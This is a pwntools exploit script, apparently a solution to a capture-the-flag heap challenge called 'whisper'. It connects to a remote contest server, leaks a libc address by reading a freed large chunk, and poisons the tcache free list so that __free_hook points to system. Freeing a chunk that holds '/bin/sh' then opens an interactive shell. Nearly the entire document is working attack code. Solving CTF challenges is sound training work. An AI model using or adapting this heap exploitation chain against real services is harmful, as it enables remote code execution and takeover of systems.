#!/usr/bin/env python3
from pwn import *
import os

context.binary = elf = ELF('./whisper', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

#offset ottenuto con p& main_arena - libc_base (vmap) di una run
main_arena_offset = 0x7ffff7f94ac0 - 0x7ffff7dd5000

def conn():
    if args.REMOTE:
        return remote('localhost', 1337)
    return process(elf.path)

p = remote("offsec.m0lecon.it", 13534)

#create first small slot
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'1') # index
p.sendlineafter(b'size: ', b'32')
p.sendlineafter(b'data: ', b'small1') #  Data

#create big slot
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'2') # index
p.sendlineafter(b'size: ', b'1500')
p.sendlineafter(b'data: ', b'big') #  Data

#create second small slot
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'3') # index
p.sendlineafter(b'size: ', b'32')
p.sendlineafter(b'data: ', b'small3') #  Data

#delete big slot
p.sendlineafter(b'> ', b'2') # delete
p.sendlineafter(b'index: ', b'2') # index


#show big slot
p.sendlineafter(b'> ', b'4') # show
p.sendlineafter(b'index: ', b'2') # index

data = p.recv(16)
libc_leak = u64(data[:8])
#print(hex(libc_leak))
libc_base = libc_leak - main_arena_offset
#print(hex(libc_base))

system    = libc_base + libc.sym["system"]
binsh     = libc_base + next(libc.search(b"/bin/sh"))
free_hook = libc_base + libc.sym["__free_hook"]


#create 2 small chucks
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'4') # index
p.sendlineafter(b'size: ', b'32')
p.sendlineafter(b'data: ', b'small3') #  Data

p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'5') # index
p.sendlineafter(b'size: ', b'32')
p.sendlineafter(b'data: ', b'small4') #  Data


#free the chucks
p.sendlineafter(b'> ', b'2') # create
p.sendlineafter(b'index: ', b'4') # index

p.sendlineafter(b'> ', b'2') # create
p.sendlineafter(b'index: ', b'5') # index

#edit last freed - Overwrite fd with &__free_hook
p.sendlineafter(b'> ', b'3') # create
p.sendlineafter(b'index: ', b'5') # index
p.sendlineafter(b'data: ', p64(free_hook)) #  Data


#create 2 more chunks
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'6') # index
p.sendlineafter(b'size: ', b'32')
p.sendlineafter(b'data: ', b'small5') #  Data

p.sendlineafter(b'> ', b'1') # create - free_hook overwritten by system
p.sendlineafter(b'index: ', b'7') # index
p.sendlineafter(b'size: ', b'32')
p.sendlineafter(b'data: ', p64(system)) #  Data

p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'8') # index
p.sendlineafter(b'size: ', b'32')
p.sendlineafter(b'data: ', p64(binsh)) #  Data


#free last one - does system(binsh)
p.sendlineafter(b'> ', b'2') # create
p.sendlineafter(b'index: ', b'8') # index

p.interactive()
